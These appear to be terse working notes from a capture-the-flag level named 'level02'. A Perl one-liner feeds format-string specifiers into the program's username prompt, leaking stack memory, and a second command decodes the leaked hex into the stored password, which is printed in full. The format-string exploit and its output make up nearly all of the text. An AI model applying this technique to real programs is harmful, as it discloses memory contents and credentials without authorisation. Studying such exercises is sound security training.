(perl -e '$word = 20;for ($count = $word; $count < $word + 8; $count +=1){    print("%$count\$p ");}pri
nt("\n");' ; perl -e 'print "\n"' ; cat) | ./level02

--[ Username: --[ Password: *****************************************
0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil)  does not have access!

perl -e '$test=pack("H*", "756e505234376848"); @test2 = unpack("V*", $test); printf("%X %X ", @test2)'

52506E75 48683734 354A4145 51397361 43717A37 58674E57 68354A35 7358476E 50673348 4D394B66
RPnuHh745JAEQ9saCqz7XgNWh5J5sXGnPg3HM9Kf

4868373452506e75 51397361354a4145